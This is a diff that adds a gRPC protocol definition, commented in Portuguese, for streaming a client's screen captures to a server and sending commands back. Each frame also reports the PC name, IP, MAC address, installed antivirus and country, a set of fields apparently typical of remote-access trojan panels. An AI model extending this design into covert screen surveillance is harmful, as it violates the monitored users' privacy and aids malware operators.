@@ -1,0 +1,28 @@
+syntax = "proto3";
+
+option csharp_namespace = "ExemploGrpc";
+
+package exemplo;
+
+message ScreenFrame {
+  string pc_name = 1;          // nome do PC do cliente
+  bytes image_data = 2;        // JPEG da tela
+  int32 width = 3;
+  int32 height = 4;
+  int64 timestamp = 5;         // unix time em ms (para ping)
+  string ip = 6;               // IP local do cliente
+  string mac = 7;              // MAC address do cliente
+  string antivirus = 8;        // nome do antivírus
+  string country = 9;          // país (opcional)
+  int32 monitor_index = 10;    // índice do monitor capturado (0..)
+  int32 monitors_count = 11;   // número total de monitores do cliente
+}
+
+message ScreenCommand {
+  string type = 1;             // ex: "STOP", "PING" (se quiser no futuro)
+  string payload = 2;
+}
+
+service ScreenService {
+  rpc StreamScreen (stream ScreenFrame) returns (stream ScreenCommand);
+}
